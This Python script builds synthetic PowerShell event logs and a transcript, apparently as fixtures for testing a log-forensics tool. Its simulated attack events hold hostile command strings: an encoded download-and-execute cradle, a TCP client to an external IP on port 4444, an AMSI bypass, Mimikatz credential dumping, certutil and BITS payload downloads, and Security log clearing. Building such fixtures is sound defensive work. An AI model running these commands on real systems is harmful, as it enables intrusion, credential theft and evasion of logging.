"""Build a synthetic PowerShell Operational EVTX + a transcript."""

from __future__ import annotations

import base64

import _evtx_synth as E

CH = "Microsoft-Windows-PowerShell/Operational"
PROV = "Microsoft-Windows-PowerShell"


def _4104(sbid, num, total, text, *, time="2026-03-16T09:00:00.000000Z"):
    return E.event_fragment(
        event_id="4104", provider=PROV, level="5", channel=CH,
        computer="WS01", time_created=time,
        data={"MessageNumber": str(num), "MessageTotal": str(total),
              "ScriptBlockText": text, "ScriptBlockId": sbid,
              "Path": "C:\\Users\\victim\\stage.ps1"})


def _4103(cmd, *, time="2026-03-16T09:05:00.000000Z"):
    ctx = ("Host Application = powershell.exe -nop -w hidden\n"
           "User = WS01\\victim\nEngine Version = 5.1\n")
    return E.event_fragment(
        event_id="4103", provider=PROV, level="4", channel=CH,
        computer="WS01", time_created=time,
        data={"ContextInfo": ctx, "Payload": cmd,
              "CommandInvocation": cmd})


ENC = base64.b64encode(
    "IEX (New-Object Net.WebClient).DownloadString('http://185.10.20.30/a')"
    .encode("utf-16-le")).decode()

BIG_SCRIPT_P1 = (
    "$ErrorActionPreference='SilentlyContinue'\n"
    "$c = New-Object System.Net.Sockets.TCPClient('45.9.148.20',4444)\n")
BIG_SCRIPT_P2 = (
    "[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')"
    ".GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)\n"
    "Invoke-Mimikatz -DumpCreds\n")


def build_evtx() -> bytes:
    frags = [
        # a benign one-part scriptblock
        _4104("sb-benign", 1, 1, "Get-ChildItem C:\\Users | Select Name"),
        # a two-part malicious scriptblock (out of order on purpose)
        _4104("sb-evil", 2, 2, BIG_SCRIPT_P2, time="2026-03-16T10:00:02.000000Z"),
        _4104("sb-evil", 1, 2, BIG_SCRIPT_P1, time="2026-03-16T10:00:01.000000Z"),
        # a 4103 module event carrying an encoded command
        _4103(f"powershell.exe -nop -w hidden -enc {ENC}"),
        # a classic 400 event
        E.event_fragment(
            event_id="400", provider="PowerShell", level="4",
            channel="Windows PowerShell", computer="WS01",
            time_created="2026-03-16T08:00:00.000000Z",
            data={"param2": "Started", "param3":
                  "HostApplication=powershell.exe -Command whoami"}),
    ]
    return E.build_evtx(frags)


TRANSCRIPT = """\
**********************
Windows PowerShell transcript start
Start time: 20260316113000
Username: WS01\\victim
RunAs User: WS01\\victim
Machine: WS01 (Microsoft Windows NT 10.0.19045.0)
Host Application: C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe
Process ID: 6644
PSVersion: 5.1.19041.4046
**********************
PS C:\\Users\\victim> certutil.exe -urlcache -split -f http://185.10.20.30/t.exe t.exe
PS C:\\Users\\victim> Start-BitsTransfer -Source http://185.10.20.30/x -Destination x
PS C:\\Users\\victim> wevtutil cl Security
**********************
Windows PowerShell transcript end
"""
